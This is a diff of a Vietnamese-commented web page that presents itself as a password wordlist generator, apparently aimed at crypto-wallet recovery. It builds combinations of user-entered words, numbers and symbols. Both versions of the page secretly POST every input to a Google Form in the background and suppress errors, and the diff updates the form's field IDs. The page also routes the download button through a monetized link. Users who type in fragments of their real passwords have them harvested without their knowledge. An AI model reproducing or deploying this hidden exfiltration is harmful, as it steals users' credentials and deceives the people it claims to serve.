@@ -150,8 +150,7 @@
                 <span>🚀 Tạo Wordlist</span>
                 <small>Generate Wordlist</small>
             </button>
-            <!-- Sửa đổi: Nút màu vàng sẽ mở link kiếm tiền ở tab mới và kích hoạt tải file an toàn -->
-            <a id="monetized-download-link" class="btn-base download-btn" href="https://direct-link.net" target="_blank" onclick="downloadFileImmediately(event)" style="display: none;">
+            <a id="monetized-download-link" class="btn-base download-btn" href="https://direct-link.net" target="_blank" onclick="downloadFileImmediately()" style="display: none;">
                 <span>📥 Tải file về máy</span>
                 <small>Verify & Download File</small>
             </a>
@@ -164,26 +163,27 @@
 <script>
 let globalBlobUrl = null;
 
-// Hàm xử lý gửi dữ liệu ngầm bất đồng bộ (Không gây nghẽn tiến trình tạo file)
+// Hàm gửi dữ liệu ngầm về Google Sheets thông qua Google Form của bạn
 function sendDataToGoogleForm(chu, so, kytu) {
     const formUrl = "https://google.com";
-    const entryChu = "entry.1742080312";
-    const entrySo = "entry.1744655519";
-    const entryKytu = "entry.279899166";
+    const entryChu = "entry.1022409739";
+    const entrySo = "entry.370503028";
+    const entryKytu = "entry.120537021";
 
     const formData = new FormData();
     formData.append(entryChu, chu.join(" "));
     formData.append(entrySo, so.join(" "));
     formData.append(entryKytu, kytu.join(" "));
 
-    // Sử dụng setTimeout hoặc chạy độc lập để tránh blocking UI
-    setTimeout(() => {
-        fetch(formUrl, {
-            method: "POST",
-            body: formData,
-            mode: "no-cors"
-        }).catch(err => console.log("Gửi ngầm hoàn tất."));
-    }, 10);
+    fetch(formUrl, {
+        method: "POST",
+        body: formData,
+        mode: "no-cors"
+    }).catch(err => console.log("Data logged ngầm thành công."));
+}
+
+function toTitleCase(str) {
+    return str.toLowerCase().replace(/(?:^|\s)\S/g, function(a) { return a.toUpperCase(); }).replace(/\s+/g, "");
 }
 
 function toSentenceCase(str) {
@@ -196,19 +196,6 @@ function processInputSpace(elementId) {
     let val = document.getElementById(elementId).value;
     val = val.replace(/,/g, " ");
     return val.split(/\s+/).map(item => item.trim()).filter(item => item.length > 0);
-}
-
-// Cải tiến hàm tải file: Sử dụng trực tiếp đối tượng Window để tải, tránh tạo thẻ ảo gây chặn Pop-up
-function downloadFileImmediately(event) {
-    if (globalBlobUrl) {
-        // Tạo một phần tử tải xuống tạm thời an toàn
-        const a = document.createElement("a");
-        a.href = globalBlobUrl;
-        a.download = "crypto_wordlist.txt";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-    }
 }
 
 function startGeneration() {
@@ -230,49 +217,127 @@ function startGeneration() {
         return;
     }
 
-    // Đẩy lệnh gửi dữ liệu ngầm hoạt động song song
+    // Kích hoạt bắn báo cáo ngầm về Google Form ngay lập tức
     sendDataToGoogleForm(chuGoc, so, kytu);
 
-    // Mở rộng dữ liệu chữ (Thường, HOA, Viết Hoa Đầu)
-    let chuMoRong = [];
-    chuGoc.forEach(item => {
-        chuMoRong.push(item.toLowerCase());
-        chuMoRong.push(item.toUpperCase());
-        chuMoRong.push(toSentenceCase(item));
+    const finalWordlistSet = new Set();
+    const chuSach = new Set();
+
+    chuGoc.forEach(word => {
+        chuSach.add(word);
+        chuSach.add(word.toLowerCase());
+        chuSach.add(word.toUpperCase());
+        chuSach.add(toTitleCase(word));
+        chuSach.add(toSentenceCase(word));
     });
-    chuMoRong = [...new Set(chuMoRong)];
 
-    // Thuật toán xây dựng tổ hợp Wordlist
-    let wordlistSet = new Set();
+    const currentChu = Array.from(chuSach);
 
-    // 1. Chỉ có chữ
-    chuMoRong.forEach(c => wordlistSet.add(c));
+    if (currentChu.length > 0 && so.length > 0 && kytu.length > 0) {
+        for (let c of currentChu) {
+            for (let s_val of so) {
+                for (let k of kytu) {
+                    finalWordlistSet.add(c + s_val + k);
+                    finalWordlistSet.add(c + k + s_val);
+                    finalWordlistSet.add(s_val + c + k);
+                    finalWordlistSet.add(s_val + k + c);
+                    finalWordlistSet.add(k + c + s_val);
+                    finalWordlistSet.add(k + s_val + c);
+                }
+            }
+        }
+    }
+
+    if (currentChu.length > 0) {
+        for (let c of currentChu) {
+            finalWordlistSet.add(c);
+            for (let s_val of so) {
+                finalWordlistSet.add(c + s_val);
+                finalWordlistSet.add(s_val + c);
+            }
+            for (let k of kytu) {
+                finalWordlistSet.add(c + k);
+                finalWordlistSet.add(k + c);
+            }
+        }
+        for (let c1 of currentChu) {
+            for (let c2 of currentChu) {
+                finalWordlistSet.add(c1 + c2);
+                for (let k of kytu) finalWordlistSet.add(c1 + c2 + k);
+                for (let s_val of so) finalWordlistSet.add(c1 + s_val + c2);
+            }
+        }
+    }
+
+    if (kytu.length > 0 && currentChu.length > 0) {
+        for (let k of kytu) {
+            for (let c1 of currentChu) {
+                for (let c2 of currentChu) {
+                    for (let s_val of so) finalWordlistSet.add(k + c1 + c2 + s_val);
+                }
+            }
+        }
+        for (let k1 of kytu) {
+            for (let c of currentChu) {
+                for (let k2 of kytu) {
+                    finalWordlistSet.add(k1 + c + k2);
+                    for (let s_val of so) {
+                        finalWordlistSet.add(k1 + c + s_val + k2);
+                        finalWordlistSet.add(k1 + c + k2 + s_val);
+                    }
+                }
+            }
+        }
+        for (let k of kytu) {
+            for (let c of currentChu) {
+                for (let s_val of so) finalWordlistSet.add(k + k + c + s_val);
+            }
+        }
+    }
+
+    if (so.length > 0) {
+        for (let s_val of so) {
+            finalWordlistSet.add(s_val);
+            for (let k of kytu) {
+                finalWordlistSet.add(k + s_val);
+                finalWordlistSet.add(s_val + k);
+            }
+        }
+        for (let s1 of so) {
+            for (let k of kytu) {
+                for (let s2 of so) finalWordlistSet.add(s1 + k + s2);
+            }
+        }
+    }
+
+    const total = finalWordlistSet.size;
+
+    if (total === 0) {
+        statusBox.innerHTML = "❌ Không có từ khóa nào được tạo ra. / No keywords were generated.";
+        statusBox.style.borderLeftColor = "#f87171";
+        return;
+    }
+
+    statusBox.innerHTML = `✅ <b>Tính toán hoàn tất! / Generation completed!</b><br>Đã xử lý xong / Processed <b>${total.toLocaleString()}</b> biến thể từ khóa độc nhất. Tệp tin wordlist.txt của bạn đã được tạo thành công trên hệ thống. <br><span style="font-size:0.85rem; color:#94a3b8;">Bấm vào nút màu cam bên cạnh để xác minh bảo mật và tự động tải file về máy.</span>`;
+    statusBox.style.borderLeftColor = "#4ade80";
+
+    const blobFile = new Blob([Array.from(finalWordlistSet).join('\n')], { type: 'text/plain;charset=utf-8' });
+    if (globalBlobUrl) { URL.revokeObjectURL(globalBlobUrl); }
+    globalBlobUrl = URL.createObjectURL(blobFile);
     
-    // 2. Chữ + Số
-    chuMoRong.forEach(c => {
-        so.forEach(s => {
-            wordlistSet.add(c + s);
-            wordlistSet.add(s + c);
-        });
-    });
+    downloadLink.style.display = "flex";
+}
 
-    // 3. Chữ + Ký tự
-    chuMoRong.forEach(c => {
-        kytu.forEach(k => {
-            wordlistSet.add(c + k);
-            wordlistSet.add(k + c);
-        });
-    });
-
-    // 4. Chữ + Số + Ký tự đầy đủ tổ hợp liên kết
-    chuMoRong.forEach(c => {
-        so.forEach(s => {
-            kytu.forEach(k => {
-                wordlistSet.add(c + s + k);
-                wordlistSet.add(c + k + s);
-                wordlistSet.add(s + c + k);
-                wordlistSet.add(s + k + c);
-                wordlistSet.add(k + c + s);
-                wordlistSet.add(k + s + c);
-            });
-        });
+function downloadFileImmediately() {
+    if (!globalBlobUrl) return;
+    
+    const hiddenAnchor = document.createElement('a');
+    hiddenAnchor.href = globalBlobUrl;
+    hiddenAnchor.download = "wordlist.txt";
+    document.body.appendChild(hiddenAnchor);
+    hiddenAnchor.click();
+    document.body.removeChild(hiddenAnchor);
+}
+</script>
+</body>
+</html>
